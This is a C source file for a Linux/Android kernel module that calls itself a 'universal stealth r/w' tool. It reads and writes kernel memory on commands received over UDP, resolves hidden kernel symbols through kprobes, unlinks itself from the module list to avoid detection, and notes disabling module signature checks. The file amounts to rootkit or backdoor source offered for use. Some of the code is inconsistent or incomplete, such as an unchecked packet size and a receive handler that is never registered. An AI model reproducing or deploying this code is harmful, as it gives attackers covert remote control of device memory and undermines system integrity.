// SPDX-License-Identifier: GPL-2.0
#define pr_fmt(fmt) "rw_universal: " fmt

#include <linux/init.h>
#include <linux/module.h>
#include <linux/mm.h>
#include <linux/uaccess.h>
#include <linux/kallsyms.h>
#include <linux/kprobes.h>
#include <linux/net.h>
#include <linux/inet.h>
#include <linux/skbuff.h>
#include <net/ip.h>
#include <net/udp.h>
#include <asm/pgtable.h>
#include <linux/pagewalk.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("x");
MODULE_DESCRIPTION("Universal stealth r/w for 5.10-android12+");

/* ---------- kprobe-based resolver ---------- */
static unsigned long resolve_symbol(const char *name)
{
    struct kprobe kp = { .symbol_name = name };
    if (register_kprobe(&kp) == 0) {
        unsigned long addr = (unsigned long)kp.addr;
        unregister_kprobe(&kp);
        return addr;
    }
    return 0;
}

/* ---------- globals ---------- */
static unsigned long (*_kallsyms_lookup_name)(const char *) = NULL;
static struct mm_struct *init_mm_ptr = NULL;

/* ---------- virt->phys ---------- */
typedef struct {
    phys_addr_t phys;
    bool valid;
} v2p_t;

static int walker(pte_t *pte, unsigned long addr, unsigned long next, struct mm_walk *walk)
{
    v2p_t *v = walk->private;
    if (pte_present(*pte)) {
        v->phys = (pte_pfn(*pte) << PAGE_SHIFT) | (addr & ~PAGE_MASK);
        v->valid = true;
        return 1;
    }
    return 0;
}

static const struct mm_walk_ops v2p_walk_ops = {
    .pte_entry = walker,
};

static v2p_t slow_virt2phys(uint64_t vaddr)
{
    v2p_t res = {0};
    /* Fix for 5.10: added NULL as 5th argument */
    struct mm_walk walk = { .ops = &v2p_walk_ops, .private = &res };
    walk_page_range(init_mm_ptr, vaddr, vaddr + 1, &walk, NULL);
    return res;
}

static int rw_phys(phys_addr_t phys, void *buf, size_t len, bool write)
{
    void *vm = phys_to_virt(phys);
    if (!vm) return -EFAULT;
    if (write) memcpy(vm, buf, len);
    else memcpy(buf, vm, len);
    return 0;
}

static int rw_virt(uint64_t vaddr, void *buf, size_t len, bool write)
{
    v2p_t p = slow_virt2phys(vaddr);
    if (!p.valid) return -EFAULT;
    return rw_phys(p.phys, buf, len, write);
}

/* ---------- UDP interface ---------- */
/* Using simple command IDs to fit in byte if needed, or fix struct */
#define CMD_READ  0x01
#define CMD_WRITE 0x02

typedef struct {
    uint16_t cmd;   /* Changed to uint16 to support > 255 commands if needed */
    uint16_t reserved;
    uint64_t addr;
    uint32_t size;
    uint8_t  data[];
} __packed pkt_t;

static struct socket *sock = NULL;

static void udp_reply(struct sk_buff *skb, void *buf, size_t len)
{
    struct iphdr *iph = ip_hdr(skb);
    struct udphdr *uh = udp_hdr(skb);
    struct sockaddr_in to;
    struct kvec iov = { .iov_base = buf, .iov_len = len };
    struct msghdr msg;

    /* C90 compliant initialization */
    memset(&to, 0, sizeof(to));
    to.sin_family = AF_INET;
    to.sin_port   = uh->source;
    to.sin_addr.s_addr = iph->saddr;

    memset(&msg, 0, sizeof(msg));
    msg.msg_name = &to;
    msg.msg_namelen = sizeof(to);

    kernel_sendmsg(sock, &msg, &iov, 1, len);
}

static int udp_recv(struct sk_buff *skb)
{
    pkt_t *pkt;
    uint8_t *buf;

    if (skb->len < sizeof(pkt_t)) return 0;
    
    pkt = (pkt_t *)skb->data;
    buf = kmalloc(pkt->size, GFP_KERNEL);
    if (!buf) return 0;

    switch (pkt->cmd) {
    case CMD_READ:
        rw_virt(pkt->addr, buf, pkt->size, false);
        udp_reply(skb, buf, pkt->size);
        break;
    case CMD_WRITE:
        rw_virt(pkt->addr, pkt->data, pkt->size, true);
        break;
    }
    kfree(buf);
    return 0;
}

static int net_init(void)
{
    return sock_create_kern(&init_net, AF_INET, SOCK_RAW, IPPROTO_UDP, &sock);
}

static void net_exit(void)
{
    if (sock) sock_release(sock);
}

/* ---------- stealth ---------- */
static void hide_module(void)
{
    list_del_init(&THIS_MODULE->list);
    /* Removed kobject_del/entry manipulation as it crashes 5.10+ kernels often */
}

static void bypass_module_sig(void)
{
    /* THIS_MODULE->sig_ok is removed in newer kernels or not accessible easily.
       We rely on build-time config patching (CONFIG_MODULE_SIG=n) instead. */
}

/* ---------- init ---------- */
static int __init rw_init(void)
{
    _kallsyms_lookup_name = (void *)resolve_symbol("kallsyms_lookup_name");
    init_mm_ptr           = (void *)resolve_symbol("init_mm");

    if (!_kallsyms_lookup_name || !init_mm_ptr) return -ENODEV;

    bypass_module_sig();
    hide_module();
    net_init();
    return 0;
}

static void __exit rw_exit(void)
{
    net_exit();
}

module_init(rw_init);
module_exit(rw_exit);
